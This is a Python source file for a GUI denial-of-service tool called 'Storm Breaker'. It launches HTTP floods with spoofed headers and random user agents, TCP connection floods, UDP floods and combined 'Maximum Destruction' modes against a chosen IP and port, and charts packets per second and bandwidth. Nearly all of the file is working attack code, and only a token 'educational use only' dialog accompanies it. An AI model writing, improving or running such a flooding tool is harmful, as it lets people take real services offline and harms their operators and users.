#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
STORM_BREAKER_DDoS.py
Advanced 100,000 PPS DDoS Tool with Modern GUI
VISUAL ASSAULT FRAMEWORK WITH REAL-TIME ANALYTICS
"""

import asyncio
import aiohttp
import socket
import random
import time
import threading
import os
import sys
import json
import psutil
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import numpy as np
from fake_useragent import UserAgent

# === HIGH-PERFORMANCE CONFIG ===
TARGET_PPS = 100000
MAX_WORKERS = 200

class StormBreakerGUI:
    """Modern GUI for Storm Breaker DDoS Tool"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("⚡ Storm Breaker DDoS Tool v20.0")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')
        
        # Attack state
        self.attacking = False
        self.stats = {
            'packets_sent': 0,
            'current_pps': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'workers_active': 0
        }
        
        # Setup GUI
        self.setup_gui()
        self.setup_charts()
        
    def setup_gui(self):
        """Setup the modern GUI interface"""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Title
        title_label = tk.Label(main_frame, text="⚡ STORM BREAKER DDoS TOOL", 
                              font=('Arial', 24, 'bold'), fg='#00ff00', bg='#1e1e1e')
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # Target Configuration Frame
        config_frame = ttk.LabelFrame(main_frame, text="🎯 Target Configuration", padding="10")
        config_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        # Target IP
        tk.Label(config_frame, text="Target IP:", fg='white', bg='#1e1e1e').grid(row=0, column=0, sticky=tk.W)
        self.target_ip = tk.Entry(config_frame, width=20, bg='#2d2d2d', fg='white')
        self.target_ip.grid(row=0, column=1, padx=(10, 20))
        self.target_ip.insert(0, "192.168.1.1")
        
        # Target Port
        tk.Label(config_frame, text="Port:", fg='white', bg='#1e1e1e').grid(row=0, column=2, sticky=tk.W)
        self.target_port = tk.Entry(config_frame, width=10, bg='#2d2d2d', fg='white')
        self.target_port.grid(row=0, column=3, padx=(10, 20))
        self.target_port.insert(0, "80")
        
        # Attack Type
        tk.Label(config_frame, text="Attack Type:", fg='white', bg='#1e1e1e').grid(row=1, column=0, sticky=tk.W, pady=(10, 0))
        self.attack_type = ttk.Combobox(config_frame, values=[
            "HTTP Flood", "TCP SYN Flood", "UDP Flood", "Mixed Assault", "Maximum Destruction"
        ], width=15)
        self.attack_type.grid(row=1, column=1, padx=(10, 20), pady=(10, 0))
        self.attack_type.set("HTTP Flood")
        
        # Workers
        tk.Label(config_frame, text="Workers:", fg='white', bg='#1e1e1e').grid(row=1, column=2, sticky=tk.W, pady=(10, 0))
        self.worker_count = tk.Scale(config_frame, from_=10, to=MAX_WORKERS, orient=tk.HORIZONTAL, 
                                   bg='#2d2d2d', fg='white', length=150)
        self.worker_count.grid(row=1, column=3, padx=(10, 20), pady=(10, 0))
        self.worker_count.set(100)
        
        # Attack Control Frame
        control_frame = ttk.LabelFrame(main_frame, text="⚡ Attack Control", padding="10")
        control_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        # Start/Stop buttons
        self.start_btn = tk.Button(control_frame, text="🚀 START ATTACK", command=self.start_attack,
                                 bg='#00aa00', fg='white', font=('Arial', 12, 'bold'), width=15)
        self.start_btn.grid(row=0, column=0, padx=(0, 10))
        
        self.stop_btn = tk.Button(control_frame, text="🛑 STOP ATTACK", command=self.stop_attack,
                                bg='#aa0000', fg='white', font=('Arial', 12, 'bold'), width=15, state=tk.DISABLED)
        self.stop_btn.grid(row=0, column=1, padx=(10, 0))
        
        # Stats Frame
        stats_frame = ttk.LabelFrame(main_frame, text="📊 Real-Time Statistics", padding="10")
        stats_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        
        # Stats labels
        stats_grid = [
            ("Packets Sent:", "packets_label"),
            ("Current PPS:", "pps_label"), 
            ("Bytes Sent:", "bytes_label"),
            ("Attack Duration:", "duration_label"),
            ("Active Workers:", "workers_label"),
            ("Target Status:", "status_label")
        ]
        
        for i, (text, var_name) in enumerate(stats_grid):
            tk.Label(stats_frame, text=text, fg='white', bg='#1e1e1e', font=('Arial', 10)).grid(row=i//3, column=(i%3)*2, sticky=tk.W)
            label = tk.Label(stats_frame, text="0", fg='#00ff00', bg='#1e1e1e', font=('Arial', 10, 'bold'))
            label.grid(row=i//3, column=(i%3)*2+1, sticky=tk.W, padx=(5, 20))
            setattr(self, var_name, label)
        
        # Charts Frame
        charts_frame = ttk.LabelFrame(main_frame, text="📈 Performance Analytics", padding="10")
        charts_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        # Create chart area
        self.setup_charts_area(charts_frame)
        
        # Log Frame
        log_frame = ttk.LabelFrame(main_frame, text="📝 Attack Log", padding="10")
        log_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.log_area = scrolledtext.ScrolledText(log_frame, height=8, bg='#2d2d2d', fg='#00ff00')
        self.log_area.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(5, weight=1)
        
    def setup_charts_area(self, parent):
        """Setup real-time charts"""
        # Create figure for matplotlib
        self.fig, (self.ax1, self.ax2) = plt.subplots(1, 2, figsize=(10, 3))
        self.fig.patch.set_facecolor('#1e1e1e')
        
        # PPS Chart
        self.ax1.set_facecolor('#2d2d2d')
        self.ax1.set_title('Packets Per Second', color='white')
        self.ax1.set_ylabel('PPS', color='white')
        self.ax1.tick_params(colors='white')
        self.pps_data = [0] * 50
        self.pps_line, = self.ax1.plot(self.pps_data, color='#00ff00')
        
        # Bandwidth Chart
        self.ax2.set_facecolor('#2d2d2d')
        self.ax2.set_title('Bandwidth Usage', color='white')
        self.ax2.set_ylabel('MB/s', color='white')
        self.ax2.tick_params(colors='white')
        self.bw_data = [0] * 50
        self.bw_line, = self.ax2.plot(self.bw_data, color='#ffaa00')
        
        # Embed chart in tkinter
        self.chart_canvas = FigureCanvasTkAgg(self.fig, parent)
        self.chart_canvas.get_tk_widget().grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
    def setup_charts(self):
        """Initialize chart data"""
        self.chart_data = {
            'pps': [0] * 50,
            'bandwidth': [0] * 50,
            'timestamps': list(range(-50, 0))
        }
        
    def log_message(self, message):
        """Add message to log with timestamp"""
        timestamp = time.strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.see(tk.END)
        
    def update_stats(self):
        """Update statistics display"""
        if self.attacking:
            elapsed = time.time() - self.stats['start_time']
            self.packets_label.config(text=f"{self.stats['packets_sent']:,}")
            self.pps_label.config(text=f"{self.stats['current_pps']:,}")
            self.bytes_label.config(text=f"{self.stats['bytes_sent']/(1024*1024):.1f} MB")
            self.duration_label.config(text=f"{elapsed:.1f}s")
            self.workers_label.config(text=f"{self.stats['workers_active']}")
            
            # Update charts
            self.pps_data.pop(0)
            self.pps_data.append(self.stats['current_pps'])
            self.pps_line.set_ydata(self.pps_data)
            self.ax1.set_ylim(0, max(self.pps_data) * 1.1 if max(self.pps_data) > 0 else 100)
            
            mb_per_second = (self.stats['bytes_sent'] / elapsed) / (1024*1024) if elapsed > 0 else 0
            self.bw_data.pop(0)
            self.bw_data.append(mb_per_second)
            self.bw_line.set_ydata(self.bw_data)
            self.ax2.set_ylim(0, max(self.bw_data) * 1.1 if max(self.bw_data) > 0 else 1)
            
            self.chart_canvas.draw()
            
            # Continue updating
            self.root.after(1000, self.update_stats)
        
    def start_attack(self):
        """Start the DDoS attack"""
        target_ip = self.target_ip.get()
        target_port = self.target_port.get()
        
        if not target_ip or not target_port:
            messagebox.showerror("Error", "Please enter target IP and port")
            return
            
        try:
            port = int(target_port)
        except ValueError:
            messagebox.showerror("Error", "Invalid port number")
            return
            
        # Start attack in separate thread
        self.attacking = True
        self.stats = {
            'packets_sent': 0,
            'current_pps': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'workers_active': self.worker_count.get()
        }
        
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        # Start attack thread
        attack_thread = threading.Thread(target=self.run_attack, args=(target_ip, port))
        attack_thread.daemon = True
        attack_thread.start()
        
        # Start stats update
        self.update_stats()
        
        self.log_message(f"🚀 ATTACK STARTED: {target_ip}:{port}")
        self.log_message(f"👥 Workers: {self.worker_count.get()}")
        self.log_message(f"🎯 Target PPS: {TARGET_PPS:,}")
        
    def stop_attack(self):
        """Stop the DDoS attack"""
        self.attacking = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log_message("🛑 ATTACK STOPPED")
        
    def run_attack(self, target_ip, target_port):
        """Run the DDoS attack in background thread"""
        asyncio.run(self._execute_attack(target_ip, target_port))
        
    async def _execute_attack(self, target_ip, target_port):
        """Execute the actual DDoS attack"""
        workers = self.worker_count.get()
        attack_type = self.attack_type.get()
        
        self.log_message(f"⚡ Launching {attack_type} with {workers} workers...")
        
        # Create attack tasks based on type
        tasks = []
        for i in range(workers):
            if attack_type == "HTTP Flood":
                task = asyncio.create_task(self._http_flood_worker(i, target_ip, target_port))
            elif attack_type == "TCP SYN Flood":
                task = asyncio.create_task(self._tcp_flood_worker(i, target_ip, target_port))
            elif attack_type == "UDP Flood":
                task = asyncio.create_task(self._udp_flood_worker(i, target_ip, target_port))
            elif attack_type == "Mixed Assault":
                task = asyncio.create_task(self._mixed_worker(i, target_ip, target_port))
            else:  # Maximum Destruction
                task = asyncio.create_task(self._max_destruction_worker(i, target_ip, target_port))
            tasks.append(task)
        
        # Start monitoring
        monitor_task = asyncio.create_task(self._stats_monitor())
        tasks.append(monitor_task)
        
        try:
            # Run until stopped
            while self.attacking:
                await asyncio.sleep(0.1)
        except Exception as e:
            self.log_message(f"💥 Attack error: {e}")
        finally:
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
    async def _http_flood_worker(self, worker_id, target_ip, target_port):
        """HTTP flood worker"""
        ua = UserAgent()
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.attacking:
                try:
                    headers = {
                        'User-Agent': ua.random,
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }
                    
                    url = f"http://{target_ip}:{target_port}/"
                    async with session.get(url, headers=headers, timeout=2, ssl=False) as response:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 500  # Approximate request size
                        
                except Exception:
                    self.stats['packets_sent'] += 1
                    
                # High frequency - minimal delay
                await asyncio.sleep(0.001)
    
    async def _tcp_flood_worker(self, worker_id, target_ip, target_port):
        """TCP SYN flood worker"""
        while self.attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.close()
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += 60  # Approximate TCP packet size
            except Exception:
                self.stats['packets_sent'] += 1
                
            await asyncio.sleep(0.001)
    
    async def _udp_flood_worker(self, worker_id, target_ip, target_port):
        """UDP flood worker"""
        while self.attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(1024)  # 1KB packets
                sock.sendto(data, (target_ip, target_port))
                sock.close()
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(data)
            except Exception:
                self.stats['packets_sent'] += 1
                
            await asyncio.sleep(0.001)
    
    async def _mixed_worker(self, worker_id, target_ip, target_port):
        """Mixed attack worker"""
        attack_methods = [self._http_flood_worker, self._tcp_flood_worker, self._udp_flood_worker]
        
        while self.attacking:
            method = random.choice(attack_methods)
            await method(worker_id, target_ip, target_port)
    
    async def _max_destruction_worker(self, worker_id, target_ip, target_port):
        """Maximum destruction worker - uses all methods"""
        while self.attacking:
            # Run all methods concurrently
            tasks = [
                self._http_flood_worker(worker_id, target_ip, target_port),
                self._tcp_flood_worker(worker_id, target_ip, target_port),
                self._udp_flood_worker(worker_id, target_ip, target_port)
            ]
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _stats_monitor(self):
        """Monitor and update statistics"""
        last_packets = 0
        last_time = time.time()
        
        while self.attacking:
            await asyncio.sleep(1)
            
            current_time = time.time()
            current_packets = self.stats['packets_sent']
            
            elapsed = current_time - last_time
            packets_sent = current_packets - last_packets
            
            if elapsed > 0:
                self.stats['current_pps'] = int(packets_sent / elapsed)
                
                # Log performance
                if self.stats['current_pps'] > TARGET_PPS * 0.8:
                    self.log_message(f"✅ Excellent performance: {self.stats['current_pps']:,} PPS")
                elif self.stats['current_pps'] < TARGET_PPS * 0.3:
                    self.log_message(f"⚠️  Low performance: {self.stats['current_pps']:,} PPS")
            
            last_packets = current_packets
            last_time = current_time

def main():
    """Main application entry point"""
    # Check for dependencies
    try:
        import matplotlib
        import aiohttp
    except ImportError as e:
        print(f"❌ Missing dependency: {e}")
        print("💡 Install with: pip install matplotlib aiohttp fake-useragent")
        return
    
    # Create and run GUI
    root = tk.Tk()
    app = StormBreakerGUI(root)
    
    # Legal warning
    messagebox.showwarning("Legal Warning", 
                          "STORM BREAKER DDoS TOOL - FOR EDUCATIONAL USE ONLY\n\n"
                          "Only use on systems you own or have explicit permission to test.\n"
                          "Unauthorized use may be illegal in your jurisdiction.")
    
    root.mainloop()

if __name__ == "__main__":
    main()